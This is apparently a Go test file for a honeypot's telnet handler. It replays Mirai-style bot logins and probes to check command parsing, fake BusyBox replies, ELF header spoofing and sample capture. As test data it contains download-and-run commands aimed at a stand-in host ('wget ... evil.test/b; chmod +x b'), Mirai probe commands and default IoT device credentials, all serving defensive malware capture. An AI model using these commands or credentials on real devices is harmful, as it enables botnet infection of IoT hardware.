package tcp

import (
	"bufio"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/mushorg/glutton/connection"
	"github.com/mushorg/glutton/protocols/recall"
	"github.com/stretchr/testify/require"
)

func TestTelnetDownloadURL(t *testing.T) {
	cases := []struct {
		cmd string
		url string
		ok  bool
	}{
		{"wget http://evil.test/a\r\n", "http://evil.test/a", true},
		{"wget -q -O- https://evil.test/b; chmod +x b\r\n", "https://evil.test/b", true},
		{"curl http://evil.test/c\r\n", "http://evil.test/c", true},
		{"/bin/busybox wget http://evil.test/d\x00\r\n", "http://evil.test/d", true},
		{"ls -la\r\n", "", false},
		{"wget missing-url\r\n", "", false},
	}
	for _, tc := range cases {
		url, ok := telnetDownloadURL(tc.cmd)
		require.Equal(t, tc.ok, ok, tc.cmd)
		require.Equal(t, tc.url, url, tc.cmd)
	}
}

func TestStripTelnetIAC(t *testing.T) {
	iac := []byte{0xff, 0xfd, 0x18, 0xff, 0xfd, 0x20, 0xff, 0xfd, 0x23, 0xff, 0xfd, 0x27}
	cleaned, negotiation := stripTelnetIAC(append(append([]byte{}, iac...), []byte("root\r\n")...))
	require.Equal(t, iac, negotiation)
	require.Equal(t, []byte("root\r\n"), cleaned)

	cleaned, negotiation = stripTelnetIAC([]byte{0xff, 0xff, 'x'})
	require.Empty(t, negotiation)
	require.Equal(t, []byte{0xff, 'x'}, cleaned)
}

func TestHandleTelnetMiraiFlow(t *testing.T) {
	client, serverConn := net.Pipe()
	defer client.Close()

	hp := newFakeHoneypot()
	logger := &recordingLogger{}

	done := make(chan error, 1)
	go func() {
		done <- HandleTelnet(context.Background(), serverConn, connection.Metadata{}, logger, hp)
	}()

	reader := bufio.NewReader(client)
	expect := func(want string) {
		t.Helper()
		require.NoError(t, client.SetReadDeadline(time.Now().Add(2*time.Second)))
		buf := make([]byte, len(want))
		_, err := io.ReadFull(reader, buf)
		require.NoError(t, err)
		require.Equal(t, want, string(buf))
	}
	send := func(data string) {
		t.Helper()
		require.NoError(t, client.SetWriteDeadline(time.Now().Add(2*time.Second)))
		_, err := client.Write([]byte(data))
		require.NoError(t, err)
	}

	negotiate := "\xff\xfd\x18\xff\xfd\x20\xff\xfd\x23\xff\xfd\x27"
	expect(negotiate)
	expect("Username: ")
	// Mirai replies with IAC negotiation then the username on the same line.
	send(negotiate + "root\r\n")
	expect("Password: ")
	send("juantech\r\n")
	expect("welcome\r\n> ")

	send("enable\x00\r\n")
	expect("-bash: enable: command not found\r\n")
	expect("> ")

	send("linuxshell\x00\r\n")
	expect("-bash: linuxshell: command not found\r\n")
	expect("> ")

	send("system\x00\r\n")
	expect("-bash: system: command not found\r\n")
	expect("> ")

	send("shell\x00\r\n")
	expect("-bash: shell: command not found\r\n")
	expect("> ")

	send("sh\x00\r\n")
	expect(telnetShPrompt)

	send("/bin/busybox UNSTABLE\x00\r\n")
	expect("UNSTABLE: applet not found\r\n")
	expect(busyboxBanner)
	expect(telnetShPrompt)

	require.NoError(t, client.Close())

	select {
	case err := <-done:
		require.NoError(t, err)
	case <-time.After(2 * time.Second):
		t.Fatal("handler did not finish")
	}

	produced := waitProduced(t, hp)
	require.Equal(t, "telnet", produced.protocol)
	select {
	case extra := <-hp.produced:
		t.Fatalf("expected a single produced event, got another: %+v", extra)
	default:
	}

	events, ok := produced.decoded.([]parsedTelnet)
	require.True(t, ok, "decoded should be []parsedTelnet")

	want := []parsedTelnet{
		{Direction: "write", Message: negotiate},
		{Direction: "write", Command: "username", Message: "Username: "},
		{Direction: "read", Message: negotiate},
		{Direction: "read", Command: "username", Message: "root\r\n"},
		{Direction: "write", Command: "password", Message: "Password: "},
		{Direction: "read", Command: "password", Message: "juantech\r\n"},
		{Direction: "write", Message: "welcome\r\n> "},
		{Direction: "read", Command: "enable", Message: "enable\x00\r\n"},
		{Direction: "write", Message: "-bash: enable: command not found\r\n"},
		{Direction: "write", Message: "> "},
		{Direction: "read", Command: "linuxshell", Message: "linuxshell\x00\r\n"},
		{Direction: "write", Message: "-bash: linuxshell: command not found\r\n"},
		{Direction: "write", Message: "> "},
		{Direction: "read", Command: "system", Message: "system\x00\r\n"},
		{Direction: "write", Message: "-bash: system: command not found\r\n"},
		{Direction: "write", Message: "> "},
		{Direction: "read", Command: "shell", Message: "shell\x00\r\n"},
		{Direction: "write", Message: "-bash: shell: command not found\r\n"},
		{Direction: "write", Message: "> "},
		{Direction: "read", Command: "sh", Message: "sh\x00\r\n"},
		{Direction: "write", Message: telnetShPrompt},
		{Direction: "read", Command: "/bin/busybox", Message: "/bin/busybox UNSTABLE\x00\r\n"},
		{Direction: "write", Message: "UNSTABLE: applet not found\r\n"},
		{Direction: "write", Message: busyboxBanner},
		{Direction: "write", Message: telnetShPrompt},
	}
	require.Equal(t, want, events)
	require.Equal(t, connection.EndClientClose, produced.endReason)
	require.Contains(t, logger.infos, "telnet login")
	require.True(t, logger.hasAttr("username", "root"))
	require.True(t, logger.hasAttr("password", "juantech"))
	require.True(t, logger.hasAttr("handler", "telnet"))
}

func TestTelnetShellCommand(t *testing.T) {
	require.Equal(t, "ping", telnetShellCommand("ping; sh\r\n"))
	require.Equal(t, "ping", telnetShellCommand("ping;sh\r\n"))
	require.Equal(t, "cat", telnetShellCommand("cat a || cat b\r\n"))
	require.Equal(t, "enable", telnetShellCommand("enable\x00\r\n"))
	require.Equal(t, "/bin/busybox", telnetShellCommand("/bin/busybox HISILICON\r\n"))
}

// armELFHeader is the ELF32 header of the arm persona: little-endian,
// e_machine 0x28, EABI5 soft-float static executable.
const armELFHeader = "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00" + // e_ident
	"\x02\x00\x28\x00\x01\x00\x00\x00" + // e_type EXEC, e_machine ARM, e_version 1
	"\x6c\xb9\x00\x00\x34\x00\x00\x00\x2c\x1f\x0c\x00" + // e_entry, e_phoff, e_shoff
	"\x00\x02\x00\x05" + // e_flags
	"\x34\x00\x20\x00\x05\x00\x28\x00\x1b\x00\x1a\x00" // e_ehsize, e_phentsize, e_phnum, e_shentsize, e_shnum, e_shstrndx

func TestTelnetArchELFHeader(t *testing.T) {
	require.Equal(t, []string{"arm", "mips", "mipsel"}, []string{telnetArches[0].name, telnetArches[1].name, telnetArches[2].name})
	require.Equal(t, armELFHeader, telnetArches[0].elfHeader())

	mips := telnetArches[1].elfHeader()
	require.Len(t, mips, 52)
	require.Equal(t, "\x7fELF\x01\x02\x01", mips[:7], "ELF32 big-endian")
	require.Equal(t, "\x00\x02\x00\x08", mips[16:20], "e_type EXEC, e_machine MIPS")
	require.Equal(t, "\x00\x40\x01\x90", mips[24:28], "e_entry")
	require.Equal(t, "\x00\x00\x10\x07", mips[36:40], "e_flags")

	mipsel := telnetArches[2].elfHeader()
	require.Equal(t, "\x7fELF\x01\x01\x01", mipsel[:7], "ELF32 little-endian")
	require.Equal(t, "\x02\x00\x08\x00", mipsel[16:20], "e_type EXEC, e_machine MIPS")
}

func TestTelnetReply(t *testing.T) {
	cases := []struct {
		cmd  string
		out  []string
		skip bool
	}{
		{"/bin/busybox cat /proc/self/exe || cat /proc/self/exe\r\n", []string{armELFHeader + "\r\n"}, false},
		{"/bin/busybox cat /proc/self/exe", []string{armELFHeader + "\r\n"}, false},
		{"cat /bin/busybox\x00", []string{armELFHeader + "\r\n"}, false},
		{"cat /bin/sh", []string{armELFHeader + "\r\n"}, false},
		{"(dd bs=52 count=1 if=.s || cat .s)", []string{armELFHeader + "\r\n"}, false},
		{"/bin/busybox cat /bin/echo", []string{"/bin/busybox cat /bin/echo\r\n" + armELFHeader + "\r\n"}, false},
		{"/bin/busybox cat /bin/sh", []string{"\r\n"}, false},
		{"/bin/busybox HISILICON\x00\r\n", []string{"HISILICON: applet not found\r\n", busyboxBanner}, false},
		{"/bin/busybox MIRAI2\r\n", []string{"MIRAI2: applet not found\r\n", busyboxBanner}, false},
		{"/bin/busybox cat /etc/nope", []string{"cat: /etc/nope: No such file or directory\r\n"}, false},
		{"cat -v /a /b | grep x", []string{"cat: /a: No such file or directory\r\ncat: /b: No such file or directory\r\n"}, false},
		{"/bin/busybox chmod 777 .s", nil, false},
		{"/bin/busybox cat /nope || /bin/busybox ps", []string{"1 pts/21   00:00:00 init\r\n"}, false},
		{"(cat .s || cp /bin/echo .s)", []string{"cat: .s: No such file or directory\r\n"}, false},
		{"shell\r\n", []string{"-bash: shell: command not found\r\n"}, false},
		{"enable\x00\r\n", []string{"-bash: enable: command not found\r\n"}, false},
		{" sh\r\n", []string{telnetShPrompt}, true},
		{"ping", []string{busyboxPingUsage}, false},
		{"/bin/busybox", []string{busyboxUsage}, false},
		{"/bin/busybox ping", []string{busyboxPingUsage}, false},
		{"\r\n", nil, false},
	}
	for _, tc := range cases {
		resp, err := telnetReply(tc.cmd, telnetArches[0])
		require.NoError(t, err, tc.cmd)
		require.Equal(t, tc.out, resp.out, tc.cmd)
		require.Equal(t, tc.skip, resp.skipPrompt, tc.cmd)
		require.Equal(t, strings.Contains(strings.Join(tc.out, ""), "\x7fELF"), resp.variant, tc.cmd)
	}

	resp, err := telnetReply("cat /proc/self/exe", telnetArches[1])
	require.NoError(t, err)
	require.Equal(t, []string{telnetArches[1].elfHeader() + "\r\n"}, resp.out)
}

// miraiConsumeAnyPrompt mirrors Mirai's scanner.c consume_any_prompt: it scans
// the receive buffer from the end down to index 1 (never 0) for a prompt sigil.
func miraiConsumeAnyPrompt(buf string) bool {
	for i := len(buf) - 1; i > 0; i-- {
		if strings.ContainsRune(":>$#%", rune(buf[i])) {
			return true
		}
	}
	return false
}

// TestTelnetShPromptMirai covers Ochi event f80c50ae-1a00-40b1-a410-18bcdeb32550:
// a bare "$ " after `sh\x00` was never seen as a prompt and the bot stalled.
func TestTelnetShPromptMirai(t *testing.T) {
	require.False(t, miraiConsumeAnyPrompt("$ "), "old reply must reproduce the stall")
	for _, cmd := range []string{"sh\x00\r\n", "sh\r\n", "sh || shell"} {
		resp, err := telnetReply(cmd, telnetArches[0])
		require.NoError(t, err, cmd)
		require.True(t, resp.skipPrompt, cmd)
		require.True(t, miraiConsumeAnyPrompt(strings.Join(resp.out, "")), cmd)
	}
}

// TestHandleTelnetArchProbe replays Ochi event 59ffc4e5-6a75-4259-8bb0-0b5ebb0a8039:
// a Mirai variant that checks for BusyBox and then reads /proc/self/exe.
func TestHandleTelnetArchProbe(t *testing.T) {
	client, serverConn := net.Pipe()
	defer client.Close()

	hp := newFakeHoneypot()
	logger := &recordingLogger{}

	done := make(chan error, 1)
	go func() {
		done <- HandleTelnet(context.Background(), serverConn, connection.Metadata{}, logger, hp)
	}()

	reader := bufio.NewReader(client)
	expect := func(want string) {
		t.Helper()
		require.NoError(t, client.SetReadDeadline(time.Now().Add(2*time.Second)))
		buf := make([]byte, len(want))
		_, err := io.ReadFull(reader, buf)
		require.NoError(t, err)
		require.Equal(t, want, string(buf))
	}
	send := func(data string) {
		t.Helper()
		require.NoError(t, client.SetWriteDeadline(time.Now().Add(2*time.Second)))
		_, err := client.Write([]byte(data))
		require.NoError(t, err)
	}

	negotiate := "\xff\xfd\x18\xff\xfd\x20\xff\xfd\x23\xff\xfd\x27"
	expect(negotiate)
	expect("Username: ")
	send(negotiate + "admin\r\n")
	expect("Password: ")
	send("admin\r\n")
	expect("welcome\r\n> ")

	send("sh\r\n")
	expect(telnetShPrompt)
	send("shell\r\n")
	expect("sh: shell: not found\r\n")
	expect(telnetShPrompt)
	send("ping; sh\r\n")
	expect(busyboxPingUsage)
	expect(telnetShPrompt)
	send("/bin/busybox HISILICON\r\n")
	expect("HISILICON: applet not found\r\n")
	expect(busyboxBanner)
	expect(telnetShPrompt)
	send("/bin/busybox cat /proc/self/exe || cat /proc/self/exe\r\n")
	expect(armELFHeader + "\r\n")
	expect(telnetShPrompt)

	require.NoError(t, client.Close())

	select {
	case err := <-done:
		require.NoError(t, err)
	case <-time.After(2 * time.Second):
		t.Fatal("handler did not finish")
	}

	produced := waitProduced(t, hp)
	require.Equal(t, "telnet", produced.protocol)
	select {
	case extra := <-hp.produced:
		t.Fatalf("expected a single produced event, got another: %+v", extra)
	default:
	}

	events, ok := produced.decoded.([]parsedTelnet)
	require.True(t, ok, "decoded should be []parsedTelnet")
	require.Equal(t, []parsedTelnet{
		{Direction: "write", Message: negotiate},
		{Direction: "write", Command: "username", Message: "Username: "},
		{Direction: "read", Message: negotiate},
		{Direction: "read", Command: "username", Message: "admin\r\n"},
		{Direction: "write", Command: "password", Message: "Password: "},
		{Direction: "read", Command: "password", Message: "admin\r\n"},
		{Direction: "write", Message: "welcome\r\n> "},
		{Direction: "read", Command: "sh", Message: "sh\r\n"},
		{Direction: "write", Message: telnetShPrompt},
		{Direction: "read", Command: "shell", Message: "shell\r\n"},
		{Direction: "write", Message: "sh: shell: not found\r\n"},
		{Direction: "write", Message: telnetShPrompt},
		{Direction: "read", Command: "ping", Message: "ping; sh\r\n"},
		{Direction: "write", Message: busyboxPingUsage},
		{Direction: "write", Message: telnetShPrompt},
		{Direction: "read", Command: "/bin/busybox", Message: "/bin/busybox HISILICON\r\n"},
		{Direction: "write", Message: "HISILICON: applet not found\r\n"},
		{Direction: "write", Message: busyboxBanner},
		{Direction: "write", Message: telnetShPrompt},
		{Direction: "read", Command: "/bin/busybox", Message: "/bin/busybox cat /proc/self/exe || cat /proc/self/exe\r\n"},
		{Direction: "write", Message: armELFHeader + "\r\n", Variant: "arm", Visit: 1},
		{Direction: "write", Message: telnetShPrompt},
	}, events)
	require.Equal(t, connection.EndClientClose, produced.endReason)
	require.True(t, logger.hasAttr("username", "admin"))
	require.True(t, logger.hasAttr("password", "admin"))
}

// startTelnetFrom runs HandleTelnet on a pipe whose remote address is remote,
// logs in, and returns the client side.
func startTelnetFrom(t *testing.T, remote net.Addr) (net.Conn, *bufio.Reader, *fakeHoneypot, *recordingLogger, chan error) {
	t.Helper()
	client, serverConn := net.Pipe()
	t.Cleanup(func() { client.Close() })
	hp := newFakeHoneypot()
	logger := &recordingLogger{}
	done := make(chan error, 1)
	go func() {
		done <- HandleTelnet(context.Background(), connWithRemote{Conn: serverConn, remote: remote}, connection.Metadata{}, logger, hp)
	}()
	reader := bufio.NewReader(client)
	telnetExpect(t, client, reader, "\xff\xfd\x18\xff\xfd\x20\xff\xfd\x23\xff\xfd\x27Username: ")
	telnetSend(t, client, "root\r\n")
	telnetExpect(t, client, reader, "Password: ")
	telnetSend(t, client, "xc3511\r\n")
	telnetExpect(t, client, reader, "welcome\r\n> ")
	return client, reader, hp, logger, done
}

func telnetExpect(t *testing.T, client net.Conn, reader *bufio.Reader, want string) {
	t.Helper()
	require.NoError(t, client.SetReadDeadline(time.Now().Add(2*time.Second)))
	buf := make([]byte, len(want))
	_, err := io.ReadFull(reader, buf)
	require.NoError(t, err)
	require.Equal(t, want, string(buf))
}

func telnetSend(t *testing.T, client net.Conn, data string) {
	t.Helper()
	require.NoError(t, client.SetWriteDeadline(time.Now().Add(2*time.Second)))
	_, err := client.Write([]byte(data))
	require.NoError(t, err)
}

func TestHandleTelnetRecallRotatesArch(t *testing.T) {
	now := time.Date(2026, 10, 12, 21, 0, 0, 0, time.UTC)
	orig := telnetRecall
	telnetRecall = recall.NewWithClock(recall.Config{Enabled: true, Gap: time.Hour}, func() time.Time { return now })
	t.Cleanup(func() { telnetRecall = orig })

	remote := staticAddr{"203.0.113.7:36696"}
	for i, arch := range []telnetArch{telnetArches[0], telnetArches[1], telnetArches[2], telnetArches[0]} {
		client, reader, hp, logger, done := startTelnetFrom(t, remote)
		telnetSend(t, client, "/bin/busybox cat /proc/self/exe || cat /proc/self/exe\r\n")
		telnetExpect(t, client, reader, arch.elfHeader()+"\r\n> ")
		require.NoError(t, client.Close())
		require.NoError(t, <-done)

		produced := waitProduced(t, hp)
		events := produced.decoded.([]parsedTelnet)
		var elf []parsedTelnet
		for _, ev := range events {
			if ev.Variant != "" {
				elf = append(elf, ev)
			}
		}
		require.Equal(t, []parsedTelnet{
			{Direction: "write", Message: arch.elfHeader() + "\r\n", Variant: arch.name, Visit: i + 1},
		}, elf, "visit %d", i+1)
		if i > 0 {
			require.Contains(t, logger.infos, "returning telnet source")
			require.True(t, logger.hasAttr("previous_variant", telnetArches[(i-1)%len(telnetArches)].name))
		}

		// A second connection within the gap stays in the same visit.
		client, reader, hp, _, done = startTelnetFrom(t, remote)
		telnetSend(t, client, "cat /bin/sh\r\n")
		telnetExpect(t, client, reader, arch.elfHeader()+"\r\n> ")
		require.NoError(t, client.Close())
		require.NoError(t, <-done)
		waitProduced(t, hp)

		now = now.Add(2 * time.Hour)
	}
}

func TestHandleTelnetFetchesWgetSample(t *testing.T) {
	payload := []byte("mirai-sample-bytes")
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write(payload)
	}))
	defer ts.Close()

	samplesDir := t.TempDir()
	prevWD, err := os.Getwd()
	require.NoError(t, err)
	require.NoError(t, os.Chdir(samplesDir))
	t.Cleanup(func() { _ = os.Chdir(prevWD) })

	client, serverConn := net.Pipe()
	defer client.Close()

	hp := newFakeHoneypot()
	logger := &recordingLogger{}
	server := newTelnetServer(serverConn)
	server.client = ts.Client()

	done := make(chan error, 1)
	go func() {
		done <- handleTelnet(context.Background(), server, connection.Metadata{TargetPort: 23}, logger, hp)
	}()

	reader := bufio.NewReader(client)
	expect := func(want string) {
		t.Helper()
		require.NoError(t, client.SetReadDeadline(time.Now().Add(2*time.Second)))
		buf := make([]byte, len(want))
		_, err := io.ReadFull(reader, buf)
		require.NoError(t, err)
		require.Equal(t, want, string(buf))
	}
	send := func(data string) {
		t.Helper()
		require.NoError(t, client.SetWriteDeadline(time.Now().Add(2*time.Second)))
		_, err := client.Write([]byte(data))
		require.NoError(t, err)
	}

	negotiate := "\xff\xfd\x18\xff\xfd\x20\xff\xfd\x23\xff\xfd\x27"
	expect(negotiate)
	expect("Username: ")
	send("bot\r\n")
	expect("Password: ")
	send("pass\r\n")
	expect("welcome\r\n> ")
	send("curl " + ts.URL + "/bin\r\n")
	expect("> ")
	require.NoError(t, client.Close())

	select {
	case err := <-done:
		require.NoError(t, err)
	case <-time.After(3 * time.Second):
		t.Fatal("handler did not finish")
	}

	produced := waitProduced(t, hp)
	events, ok := produced.decoded.([]parsedTelnet)
	require.True(t, ok)

	var found bool
	sum := sha256.Sum256(payload)
	wantHash := hex.EncodeToString(sum[:])
	for _, ev := range events {
		if ev.Direction == "read" && ev.Command == "curl" {
			require.Equal(t, ts.URL+"/bin", ev.Path)
			require.Equal(t, wantHash, ev.PayloadHash)
			found = true
		}
	}
	require.True(t, found, "expected curl read frame with path and payload_hash")
	require.Contains(t, logger.infos, "telnet login")
	require.Contains(t, logger.infos, "New sample fetched")
	require.FileExists(t, filepath.Join("samples", wantHash))
}

func TestHandleTelnetClientDisconnect(t *testing.T) {
	client, serverConn := net.Pipe()

	hp := newFakeHoneypot()
	logger := &recordingLogger{}

	done := make(chan error, 1)
	go func() {
		done <- HandleTelnet(context.Background(), serverConn, connection.Metadata{}, logger, hp)
	}()

	reader := bufio.NewReader(client)
	require.NoError(t, client.SetReadDeadline(time.Now().Add(2*time.Second)))
	negotiate := make([]byte, 12)
	_, err := io.ReadFull(reader, negotiate)
	require.NoError(t, err)
	userPrompt := make([]byte, len("Username: "))
	_, err = io.ReadFull(reader, userPrompt)
	require.NoError(t, err)
	require.Equal(t, "Username: ", string(userPrompt))

	require.NoError(t, client.Close())

	select {
	case err := <-done:
		require.NoError(t, err)
	case <-time.After(2 * time.Second):
		t.Fatal("handler did not finish")
	}

	produced := waitProduced(t, hp)
	require.Equal(t, "telnet", produced.protocol)
	events, ok := produced.decoded.([]parsedTelnet)
	require.True(t, ok)
	require.Equal(t, []parsedTelnet{
		{Direction: "write", Message: string(negotiate)},
		{Direction: "write", Command: "username", Message: "Username: "},
	}, events)
	require.Equal(t, connection.EndClientClose, produced.endReason)
}

func TestHandleTelnetTLSClientHello(t *testing.T) {
	client, serverConn := net.Pipe()
	defer client.Close()

	hp := newFakeHoneypot()
	logger := &recordingLogger{}

	done := make(chan error, 1)
	go func() {
		done <- HandleTelnet(context.Background(), serverConn, connection.Metadata{}, logger, hp)
	}()

	reader := bufio.NewReader(client)
	require.NoError(t, client.SetReadDeadline(time.Now().Add(2*time.Second)))
	greeting := make([]byte, 12+len("Username: "))
	_, err := io.ReadFull(reader, greeting)
	require.NoError(t, err)

	// TLS 1.2 ClientHello prefix with 0x0a bytes that used to split into frames.
	hello := []byte{0x16, 0x03, 0x01, 0x00, 0x75, 0x01, 0x00, 0x00, 0x71, 0x03, 0x03, 0x0a, 0x0a, 0x0a, 0x00, 0x2f}
	require.NoError(t, client.SetWriteDeadline(time.Now().Add(2*time.Second)))
	_, err = client.Write(hello)
	require.NoError(t, err)

	select {
	case err := <-done:
		require.NoError(t, err)
	case <-time.After(2 * time.Second):
		t.Fatal("handler did not finish")
	}

	produced := waitProduced(t, hp)
	require.Equal(t, "telnet", produced.protocol)
	events, ok := produced.decoded.([]parsedTelnet)
	require.True(t, ok)
	require.Equal(t, []parsedTelnet{
		{Direction: "write", Message: string(greeting[:12])},
		{Direction: "write", Command: "username", Message: "Username: "},
		{Direction: "read", Command: "tls_client_hello", Message: string(hello)},
	}, events)

	logger.mtx.Lock()
	defer logger.mtx.Unlock()
	require.Empty(t, logger.infos)
}

func TestAshNotFound(t *testing.T) {
	require.Equal(t, "sh: linuxshell: not found\r\n", ashNotFound("-bash: linuxshell: command not found\r\n"))
	require.Equal(t, "nc: command not found\r\n", ashNotFound("nc: command not found\r\n"))
	require.Equal(t, "-bash: odd\r\n", ashNotFound("-bash: odd\r\n"))
}
